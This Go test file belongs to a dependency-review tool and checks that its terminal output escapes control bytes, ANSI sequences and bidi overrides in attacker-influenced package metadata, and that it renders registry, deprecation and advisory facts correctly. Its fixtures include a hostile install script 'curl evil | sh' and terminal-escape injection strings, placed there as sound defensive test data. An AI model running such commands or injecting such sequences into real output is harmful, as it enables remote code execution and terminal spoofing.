package output

// The tests below embed raw control and bidi bytes in string literals on
// purpose, to prove EscapeText escapes them in output; ST1018 (which suggests
// \u escapes) is exactly the thing under test, so silence it for this file.
//lint:file-ignore ST1018 intentional raw control/bidi bytes in trojan-source fixtures

import (
	"strings"
	"testing"

	"github.com/rvagg/depsound/internal/fetch"
	"github.com/rvagg/depsound/internal/manifest"
	"github.com/rvagg/depsound/internal/npmpkg"
	"github.com/rvagg/depsound/internal/osv"
	"github.com/rvagg/depsound/internal/provenance"
	"github.com/rvagg/depsound/internal/stats"
)

// Attacker-influenced strings must reach the terminal with C0/C1 control
// bytes and bidi overrides escaped and length capped. Keys are as
// attacker-chosen as values.
func TestTextTaintsHostileStrings(t *testing.T) {
	long := strings.Repeat("A", 5000)
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "npm", Name: "xname", From: "1", To: "2"},
		Runnable: stats.Runnable{
			// attacker-chosen map KEY, not just value
			Lifecycle: []npmpkg.Change{{Key: "pre\x1b]0;pwn\x07install", Status: "added", To: "curl evil | sh\x1b]0;pwned\x07"}},
		},
		Compat: stats.Compat{TypeFrom: "commonjs", TypeTo: "modu‮le"},
		Dependencies: []npmpkg.DepChange{
			{Section: "dependencies", Name: "bad\x1bdep", Status: "added", To: long},
		},
		Files: stats.FilesSection{
			Flagged: []stats.Flag{{Path: "dist/\x07bell.js", Reason: "minified-looking (long lines)"}},
		},
		Notes: []string{"err: \x1b[2Jwiped"},
	}
	out := Text(s)

	for _, raw := range []string{"\x1b", "\x07", "", "‮"} {
		if strings.Contains(out, raw) {
			t.Errorf("raw control/bidi %q reached output", raw)
		}
	}
	if !strings.Contains(out, `\x1b`) {
		t.Error("control bytes should be visibly escaped")
	}
	if strings.Contains(out, long) {
		t.Error("overlong tainted string not capped")
	}
	if !strings.Contains(out, "...[truncated]") {
		t.Error("truncation not marked")
	}
}

func TestTaint(t *testing.T) {
	if got := EscapeText("normal-string.js"); got != "normal-string.js" {
		t.Errorf("benign string altered: %q", got)
	}
	if got := EscapeText("a\x00b\x7fc"); got != `a\x00b\x7fc` {
		t.Errorf("control escape = %q", got)
	}
	if got := EscapeText(string([]byte{0xff, 0xfe})); strings.ContainsRune(got, 0xff) {
		t.Errorf("invalid UTF-8 leaked: %q", got)
	}
	if got := EscapeText("‮"); got != `\x9b\u202e` {
		t.Errorf("C1/bidi escape = %q", got)
	}
	// truncation must cut at a rune boundary, never mid-rune
	long := strings.Repeat("x", 199) + "日本語"
	got := EscapeText(long)
	if !strings.HasSuffix(got, "...[truncated]") || strings.ContainsRune(got, '�') {
		t.Errorf("rune-boundary truncation broken: %q", got)
	}
}

func TestESMImportOnly(t *testing.T) {
	// commander shape: require flips cjs->esm (require breaks), import remains
	commander := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: "./index.js (esm)"},
		{Subpath: ".", Condition: "import", From: "./esm.mjs (esm)", To: "./index.js (esm)"},
	}
	if !esmImportOnly(commander) {
		t.Error("commander cjs->esm require flip should be ESM import-only")
	}
	// require removed entirely, import remains
	removed := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: ""},
		{Subpath: ".", Condition: "import", From: "", To: "./index.mjs (esm)"},
	}
	if !esmImportOnly(removed) {
		t.Error("require removed should be ESM import-only")
	}
	// dual package (require still resolves to CJS) is NOT import-only
	dual := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.cjs (cjs)", To: "./index.cjs (cjs)"},
		{Subpath: ".", Condition: "import", From: "./index.mjs (esm)", To: "./index.mjs (esm)"},
	}
	if esmImportOnly(dual) {
		t.Error("dual package must not read as ESM import-only")
	}
}

func TestCensusRendersRegistryActionsAsFacts(t *testing.T) {
	out := CensusText(&Census{
		Ecosystem: "crates",
		Name:      "arrayref",
		Version:   "0.3.10",
		Files:     1,
		Provenance: &provenance.Result{
			Queried:                     true,
			RegistryActionsSinceVersion: "0.3.9",
			RegistryActionsSince:        "2026-08-20T07:15:00Z",
			RegistryActionsObservedAt:   "2026-08-20T08:00:00Z",
			RegistryActions: []provenance.RegistryAction{
				{Version: "0.3.10", Action: "publish", Actor: "droundy", At: "2026-08-20T07:15:00Z"},
				{Version: "0.3.9", Action: "yank", Actor: "droundy", At: "2026-08-20T07:15:00.100Z"},
			},
		},
	})
	for _, want := range []string{"registry yank/unyank actions since 0.3.9 was published", "2026-08-20T07:15:00.100Z yank 0.3.9 by droundy"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "publish 0.3.10") {
		t.Errorf("ordinary publish actions should remain JSON-only:\n%s", out)
	}
}

func TestCensusRendersExactDeprecationAndRetractions(t *testing.T) {
	out := CensusText(&Census{
		Ecosystem: "go",
		Name:      "example.com/mod",
		Version:   "v1.0.3",
		Files:     1,
		Provenance: &provenance.Result{
			Queried:               true,
			Deprecated:            true,
			DeprecationScope:      "go-module",
			DeprecationReason:     "use example.com/mod/v2 instead",
			DeprecationSource:     "https://proxy.golang.org/example.com/mod/@v/v1.2.0.mod",
			DeprecationObservedAt: "2026-08-21T01:02:03Z",
			RetractionsVersion:    "v1.2.0",
			RetractionsObservedAt: "2026-08-21T01:02:03Z",
			Retractions: []provenance.Retraction{
				{Low: "v0.9.0", Rationale: "published accidentally"},
				{Low: "v1.0.0", High: "v1.0.5", Rationale: "data corruption", MatchesReviewed: true},
			},
		},
	})
	for _, want := range []string{
		"Go module deprecated by its latest go.mod: use example.com/mod/v2 instead",
		"observed 2026-08-21T01:02:03Z; observation time, not change time",
		"Go retractions declared by v1.2.0 go.mod",
		"[v1.0.0, v1.0.5]: data corruption (matches reviewed version)",
		"v0.9.0: published accidentally",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
}

func TestUnavailableDiffKeepsAdvisoriesAndRegistryHistory(t *testing.T) {
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "crates", Name: "arrayref", From: "0.3.9", To: "0.3.10"},
		Artifact: stats.Artifact{Unavailable: []*stats.Unavailable{{
			Side: "to", Version: "0.3.10", Kind: "absent", Stage: "registry-index", Reason: "version-absent",
			URL:         "https://index.crates.io/ar/ra/arrayref",
			ArtifactURL: "https://static.crates.io/crates/arrayref/arrayref-0.3.10.crate",
			Hint:        "version absent from sparse index",
		}}},
		Security: stats.Security{Queried: true, Introduced: []osv.Vuln{
			{ID: "RUSTSEC-2026-0260", Kind: osv.KindMalware},
		}},
		Provenance: &provenance.Result{
			Queried: true,
			Sources: map[string]string{"depsdev": "complete", "registry": "complete"},
			RegistryActions: []provenance.RegistryAction{
				{Version: "0.3.9", Action: "yank", Actor: "owner", At: "2026-08-20T07:15:24Z"},
			},
		},
	}
	s.Coverage, s.NextActions = Guide(s, "")
	out := Text(s)
	for _, want := range []string{
		"RUSTSEC-2026-0260", "2026-08-20", "owner",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("unavailable report missing %q:\n%s", want, out)
		}
	}
}

func TestUnavailableDiffPreservesBothEndpointOutcomes(t *testing.T) {
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "crates", Name: "x", From: "1.0.0", To: "2.0.0"},
		Artifact: stats.Artifact{Unavailable: []*stats.Unavailable{
			{Side: "from", Version: "1.0.0", Kind: "absent", Stage: "registry-index", Reason: "version-absent", URL: "https://index.example/x", ArtifactURL: "https://archive.example/x-1.0.0.crate"},
			{Side: "to", Version: "2.0.0", Kind: "denied", Stage: "artifact", URL: "https://archive.example/x-2.0.0.crate", Status: 403, Reason: "policy-blocked", PolicyReason: "blocked\x1b"},
		}},
	}
	out := Text(s)
	for _, want := range []string{
		"https://index.example/x", "https://archive.example/x-1.0.0.crate",
		"https://archive.example/x-2.0.0.crate", "blocked\\x1b",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "HTTP 0") {
		t.Fatalf("rendered fabricated HTTP status:\n%s", out)
	}
}

func TestUnavailableEvidenceEscapesEachLongField(t *testing.T) {
	longURL := "https://registry.example/" + strings.Repeat("u", 260)
	longPolicy := "policy-" + strings.Repeat("p", 260)
	longHint := "hint-" + strings.Repeat("h", 260)
	s := &stats.Stats{Package: stats.PkgRef{Ecosystem: "npm", Name: "x", From: "1", To: "2"},
		Artifact: stats.Artifact{Unavailable: []*stats.Unavailable{{
			Side: "to", Version: "2", Kind: "denied", URL: longURL, Reason: "policy-blocked", PolicyReason: longPolicy, Hint: longHint,
		}}},
	}
	out := Text(s)
	for _, want := range []string{longURL[:100], longPolicy[:100], longHint[:100]} {
		if !strings.Contains(out, want) {
			t.Errorf("missing field %q:\n%s", want, out)
		}
	}
}

func TestRegistryChecksumOutcomesRemainDistinct(t *testing.T) {
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "crates", Name: "x", From: "1.0.0", To: "2.0.0"},
		Artifact: stats.Artifact{
			SourceFrom: &stats.Source{RegistryChecksum: &fetch.RegistryChecksum{
				State: "version-absent", URL: "https://index.example/x", ObservedAt: "2026-08-21T00:00:00Z", Status: 200,
			}},
			SourceTo: &stats.Source{RegistryChecksum: &fetch.RegistryChecksum{
				State: "lookup-failed", URL: "https://index.example/x", ObservedAt: "2026-08-21T00:00:00Z", Status: 503, Error: "index unavailable\x1b",
			}},
		},
		Security: stats.Security{Queried: true},
	}
	out := Text(s)
	for _, want := range []string{"index unavailable\\x1b"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	ledger := Derive("", s)
	var absent, failed bool
	for _, sig := range ledger.Signals {
		if sig.Code != CodeRegistryChecksum {
			continue
		}
		absent = absent || sig.Kind == KindFact
		failed = failed || sig.Kind == KindDegradation
	}
	if !absent || !failed {
		t.Fatalf("checksum outcomes lost their distinct meaning: %#v", ledger.Signals)
	}
}

func TestUnavailableCensusKeepsAdvisoriesAndRegistryHistory(t *testing.T) {
	c := &Census{
		Ecosystem: "crates", Name: "arrayref", Version: "0.3.10",
		Unavailable: &stats.Unavailable{
			Version: "0.3.10", Kind: "absent", URL: "https://example.invalid/arrayref.crate",
		},
		OSVQueried: true,
		Vulns:      []osv.Vuln{{ID: "MAL-2026-14336", Kind: osv.KindMalware}},
		Provenance: &provenance.Result{
			Queried: true,
			Sources: map[string]string{"depsdev": "complete", "registry": "complete"},
			RegistryActions: []provenance.RegistryAction{
				{Version: "0.3.9", Action: "unyank", Actor: "admin", At: "2026-08-20T09:15:51Z"},
			},
		},
		Source: &stats.Source{RegistryChecksum: &fetch.RegistryChecksum{
			State: "lookup-failed", URL: "https://index.example/arrayref", ObservedAt: "2026-08-21T00:00:00Z", Error: "unavailable",
		}},
	}
	c.Coverage, c.NextActions = CensusGuide(c)
	out := CensusText(c)
	for _, want := range []string{
		"MAL-2026-14336", "https://index.example/arrayref", "admin",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("unavailable census missing %q:\n%s", want, out)
		}
	}
}
